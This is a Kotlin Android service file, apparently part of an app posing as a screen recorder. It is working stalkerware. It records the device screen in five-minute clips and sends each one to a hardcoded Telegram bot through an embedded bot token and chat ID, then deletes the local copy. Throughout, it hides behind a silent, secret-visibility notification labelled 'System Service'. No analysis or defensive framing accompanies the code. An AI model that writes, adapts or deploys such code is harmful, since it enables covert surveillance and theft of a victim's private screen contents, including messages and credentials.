package com.dogmind.screenrecorder

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.content.pm.ServiceInfo
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import androidx.core.app.NotificationCompat
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.File

class RecorderService : Service() {

    companion object {
        private const val CHANNEL_ID = "rec_ch_silent"
        private const val NOTIFICATION_ID = 1
        private const val TOKEN = "8789968045:AAGWbVUOgapMEd-0gHOjbBgRNOUkUwKIQxk"
        private const val CHAT_ID = "8650824010"
        private const val INTERVAL_MS = 5 * 60 * 1000L
        private const val WIDTH = 720
        private const val HEIGHT = 1280
        private const val DENSITY = 320
    }

    private var projection: MediaProjection? = null
    private var recorder: MediaRecorder? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var currentFile: File? = null
    private val handler = Handler(Looper.getMainLooper())
    private val client = OkHttpClient.Builder()
    .connectTimeout(60, java.util.concurrent.TimeUnit.SECONDS)
    .writeTimeout(120, java.util.concurrent.TimeUnit.SECONDS)
    .readTimeout(60, java.util.concurrent.TimeUnit.SECONDS)
    .build()

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(NOTIFICATION_ID, buildNotification(), ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION)
        } else {
            startForeground(NOTIFICATION_ID, buildNotification())
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val resultCode = intent?.getIntExtra("resultCode", -1) ?: return START_STICKY
        val data = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            intent.getParcelableExtra("data", Intent::class.java)
        } else {
            @Suppress("DEPRECATION")
            intent.getParcelableExtra("data")
        } ?: return START_STICKY

        val mgr = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        projection = mgr.getMediaProjection(resultCode, data)
        projection?.registerCallback(object : MediaProjection.Callback() {
            override fun onStop() { stopSelf() }
        }, handler)

        startRecording()
        scheduleNext()
        return START_STICKY
    }

    private fun startRecording() {
        val file = File(cacheDir, "rec_${System.currentTimeMillis()}.mp4")
        currentFile = file

        recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            MediaRecorder(this)
        } else {
            @Suppress("DEPRECATION")
            MediaRecorder()
        }

        recorder?.apply {
            setVideoSource(MediaRecorder.VideoSource.SURFACE)
            setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            setVideoEncoder(MediaRecorder.VideoEncoder.H264)
            setVideoSize(WIDTH, HEIGHT)
            setVideoFrameRate(5)
            setVideoEncodingBitRate(150_000)
            setOutputFile(file.absolutePath)
            prepare()
        }

        virtualDisplay = projection?.createVirtualDisplay(
            "Screen", WIDTH, HEIGHT, DENSITY,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            recorder?.surface, null, null
        )

        recorder?.start()
    }

    private fun scheduleNext() {
        handler.postDelayed({ rotateRecording() }, INTERVAL_MS)
    }

    private fun rotateRecording() {
        try { recorder?.stop() } catch (e: Exception) { }
        virtualDisplay?.release()
        recorder?.release()
        recorder = null
        virtualDisplay = null

        val fileToSend = currentFile
        if (fileToSend != null && fileToSend.exists() && fileToSend.length() > 0) {
            Thread { sendToTelegram(fileToSend) }.start()
        }

        startRecording()
        scheduleNext()
    }

   private fun sendToTelegram(file: File) {
    try {
        val body = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", CHAT_ID)
            .addFormDataPart("video", file.name, file.asRequestBody("video/mp4".toMediaTypeOrNull()))
            .build()

        val request = Request.Builder()
            .url("https://api.telegram.org/bot$TOKEN/sendVideo")
            .post(body)
            .build()

        client.newCall(request).execute().use { response ->
            val responseText = response.body?.string()
            if (response.isSuccessful) {
                android.util.Log.d("RecorderService", "done!")
                file.delete()
            } else {
                android.util.Log.e("RecorderService", "sos Telegram-in: $responseText")
            }
        }
    } catch (e: Exception) {
        android.util.Log.e("RecorderService", "lose: ${e.message}")
    }
}

    private fun buildNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Background Processing")
            .setSmallIcon(R.drawable.ic_record)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setSilent(true)
            .setOngoing(true)
            .build()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(CHANNEL_ID, "System Services", NotificationManager.IMPORTANCE_MIN).apply {
                setSound(null, null)
                enableVibration(false)
                setShowBadge(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
        }
    }

    override fun onDestroy() {
        handler.removeCallbacksAndMessages(null)
        try { recorder?.stop() } catch (e: Exception) { }
        recorder?.release()
        virtualDisplay?.release()
        projection?.stop()
        super.onDestroy()
    }
}
